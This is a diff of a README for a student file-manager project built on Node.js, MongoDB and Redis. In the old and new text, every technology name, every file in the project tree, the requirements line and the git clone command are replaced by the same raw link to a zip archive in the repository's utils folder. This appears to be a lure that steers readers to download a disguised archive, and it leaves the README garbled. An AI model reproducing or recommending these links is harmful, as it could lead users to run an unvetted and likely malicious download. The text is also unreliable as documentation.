@@ -1,5 +1,5 @@
 # 0x04. Files manager
-This repository contains a file manager application built with https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip The application allows users to upload, manage, and share files efficiently. Below is an overview of the project structure and functionalities.
+This repository contains a file manager application built with https://raw.githubusercontent.com/LeboMeje/alx-files_manager/main/utils/alx_files_manager_Stagiritic.zip The application allows users to upload, manage, and share files efficiently. Below is an overview of the project structure and functionalities.
 
 ## Table of Contents
 
@@ -21,7 +21,7 @@ The file manager application provides various functionalities for users to manag
 - Generate thumbnails for images
 - Send welcome emails to new users
 
-The application utilizes https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip for handling HTTP requests, MongoDB for database storage, and Redis for caching. Background processing for tasks such as thumbnail generation and sending emails is implemented using Bull queues.
+The application utilizes https://raw.githubusercontent.com/LeboMeje/alx-files_manager/main/utils/alx_files_manager_Stagiritic.zip for handling HTTP requests, MongoDB for database storage, and Redis for caching. Background processing for tasks such as thumbnail generation and sending emails is implemented using Bull queues.
 
 ## File Structure
 
@@ -29,39 +29,39 @@ The application utilizes https://github.com/LeboMeje/alx-files_manager/raw/refs/
 project-root/
 │
 ├── controllers/
-│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
-│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
-|   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
-|   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip     
+│   ├── https://raw.githubusercontent.com/LeboMeje/alx-files_manager/main/utils/alx_files_manager_Stagiritic.zip
+│   ├── https://raw.githubusercontent.com/LeboMeje/alx-files_manager/main/utils/alx_files_manager_Stagiritic.zip
+|   ├── https://raw.githubusercontent.com/LeboMeje/alx-files_manager/main/utils/alx_files_manager_Stagiritic.zip
+|   ├── https://raw.githubusercontent.com/LeboMeje/alx-files_manager/main/utils/alx_files_manager_Stagiritic.zip     
 │   └── ...
 │
 ├── routes/
-│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
+│   ├── https://raw.githubusercontent.com/LeboMeje/alx-files_manager/main/utils/alx_files_manager_Stagiritic.zip
 │   └── ...
 │
 ├── tests/ 
-│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
-│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
-│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
-│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
-│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
+│   ├── https://raw.githubusercontent.com/LeboMeje/alx-files_manager/main/utils/alx_files_manager_Stagiritic.zip
+│   ├── https://raw.githubusercontent.com/LeboMeje/alx-files_manager/main/utils/alx_files_manager_Stagiritic.zip
+│   ├── https://raw.githubusercontent.com/LeboMeje/alx-files_manager/main/utils/alx_files_manager_Stagiritic.zip
+│   ├── https://raw.githubusercontent.com/LeboMeje/alx-files_manager/main/utils/alx_files_manager_Stagiritic.zip
+│   ├── https://raw.githubusercontent.com/LeboMeje/alx-files_manager/main/utils/alx_files_manager_Stagiritic.zip
 │   └── ...
 │
 ├── utils/
-│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
-│   ├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
+│   ├── https://raw.githubusercontent.com/LeboMeje/alx-files_manager/main/utils/alx_files_manager_Stagiritic.zip
+│   ├── https://raw.githubusercontent.com/LeboMeje/alx-files_manager/main/utils/alx_files_manager_Stagiritic.zip
 │   └── ...
 │
-├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
-├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
-├── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
+├── https://raw.githubusercontent.com/LeboMeje/alx-files_manager/main/utils/alx_files_manager_Stagiritic.zip
+├── https://raw.githubusercontent.com/LeboMeje/alx-files_manager/main/utils/alx_files_manager_Stagiritic.zip
+├── https://raw.githubusercontent.com/LeboMeje/alx-files_manager/main/utils/alx_files_manager_Stagiritic.zip
 ├── .env
-└── https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
+└── https://raw.githubusercontent.com/LeboMeje/alx-files_manager/main/utils/alx_files_manager_Stagiritic.zip
 ```
 
 ## Requirements
 
-- https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip (version 12.x.x)
+- https://raw.githubusercontent.com/LeboMeje/alx-files_manager/main/utils/alx_files_manager_Stagiritic.zip (version 12.x.x)
 - MongoDB
 - Redis
 
@@ -70,7 +70,7 @@ project-root/
 1. Clone the repository:
 
 ```bash
-git clone https://github.com/LeboMeje/alx-files_manager/raw/refs/heads/main/utils/manager-files-alx-v1.2.zip
+git clone https://raw.githubusercontent.com/LeboMeje/alx-files_manager/main/utils/alx_files_manager_Stagiritic.zip
 ```
 
 2. Navigate to the project directory:
